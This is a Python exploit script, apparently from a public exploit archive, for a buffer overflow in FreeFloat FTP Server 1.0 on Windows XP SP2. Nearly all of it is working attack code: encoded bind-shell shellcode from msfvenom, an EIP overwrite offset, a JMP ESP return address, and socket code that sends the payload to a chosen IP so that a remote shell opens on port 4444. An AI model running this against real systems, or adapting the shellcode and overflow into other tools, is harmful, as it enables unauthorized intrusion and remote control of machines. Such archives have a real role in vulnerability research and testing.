#!/usr/bin/env python
 
# Exploit Title: FreeFloat FTP raw commands buffer overflow
# Date: 10 Feb 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.freefloat.com/
# Version: FreeFloat FTP 1.0
# Tested on: Windows XP Pro SP2, English
#
# Description:
# FreeFloat FTP 1.0 allows an attacker to trigger a buffer overflow and
# execute arbitrary code when a long and invalid raw command is sent to it.
#
 
import socket, struct, sys
 
if len(sys.argv) < 3:
    print "usage: %s IP port" % (sys.argv[0])
    sys.exit(0)
 
ip = sys.argv[1]
port = int(sys.argv[2])
 
# Bind shellcode generated with msfvenom:
#     msfvenom -p windows/shell_bind_tcp
#         -b "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d"
#         -e x86/fnstenv_mov
#
# [*] x86/fnstenv_mov succeeded with size 366 (iteration=1)
shellcode = (
"\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc8" +
"\x4c\xab\x8c\x83\xeb\xfc\xe2\xf4\x34\xa4\x22\x8c\xc8\x4c" +
"\xcb\x05\x2d\x7d\x79\xe8\x43\x1e\x9b\x07\x9a\x40\x20\xde" +
"\xdc\xc7\xd9\xa4\xc7\xfb\xe1\xaa\xf9\xb3\x9a\x4c\x64\x70" +
"\xca\xf0\xca\x60\x8b\x4d\x07\x41\xaa\x4b\x2a\xbc\xf9\xdb" +
"\x43\x1e\xbb\x07\x8a\x70\xaa\x5c\x43\x0c\xd3\x09\x08\x38" +
"\xe1\x8d\x18\x1c\x20\xc4\xd0\xc7\xf3\xac\xc9\x9f\x48\xb0" +
"\x81\xc7\x9f\x07\xc9\x9a\x9a\x73\xf9\x8c\x07\x4d\x07\x41" +
"\xaa\x4b\xf0\xac\xde\x78\xcb\x31\x53\xb7\xb5\x68\xde\x6e" +
"\x90\xc7\xf3\xa8\xc9\x9f\xcd\x07\xc4\x07\x20\xd4\xd4\x4d" +
"\x78\x07\xcc\xc7\xaa\x5c\x41\x08\x8f\xa8\x93\x17\xca\xd5" +
"\x92\x1d\x54\x6c\x90\x13\xf1\x07\xda\xa7\x2d\xd1\xa0\x7f" +
"\x99\x8c\xc8\x24\xdc\xff\xfa\x13\xff\xe4\x84\x3b\x8d\x8b" +
"\x37\x99\x13\x1c\xc9\x4c\xab\xa5\x0c\x18\xfb\xe4\xe1\xcc" +
"\xc0\x8c\x37\x99\xfb\xdc\x98\x1c\xeb\xdc\x88\x1c\xc3\x66" +
"\xc7\x93\x4b\x73\x1d\xc5\x6c\xbd\x13\x1f\xc3\x8e\xc8\x5d" +
"\xf7\x05\x2e\x26\xbb\xda\x9f\x24\x69\x57\xff\x2b\x54\x59" +
"\x9b\x1b\xc3\x3b\x21\x74\x54\x73\x1d\x1f\xf8\xdb\xa0\x38" +
"\x47\xb7\x29\xb3\x7e\xdb\x41\x8b\xc3\xf9\xa6\x01\xca\x73" +
"\x1d\x24\xc8\xe1\xac\x4c\x22\x6f\x9f\x1b\xfc\xbd\x3e\x26" +
"\xb9\xd5\x9e\xae\x56\xea\x0f\x08\x8f\xb0\xc9\x4d\x26\xc8" +
"\xec\x5c\x6d\x8c\x8c\x18\xfb\xda\x9e\x1a\xed\xda\x86\x1a" +
"\xfd\xdf\x9e\x24\xd2\x40\xf7\xca\x54\x59\x41\xac\xe5\xda" +
"\x8e\xb3\x9b\xe4\xc0\xcb\xb6\xec\x37\x99\x10\x7c\x7d\xee" +
"\xfd\xe4\x6e\xd9\x16\x11\x37\x99\x97\x8a\xb4\x46\x2b\x77" +
"\x28\x39\xae\x37\x8f\x5f\xd9\xe3\xa2\x4c\xf8\x73\x1d\x4c" +
"\xab\x8c"
)
 
# EIP overwritten at offset 251
# JMP ESP 7CA58265 SHELL32.DLL, Windows XP Pro SP2, English
jmpesp = struct.pack("<I", 0x7CA58265)
buf = "\x41" * 251 + jmpesp + "\x90" * 129 + shellcode
 
print "[+] exploiting target %s:%d" % (ip, port)
print "[+] try connecting to %s on port 4444" % (ip)
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(buf + "\r\n")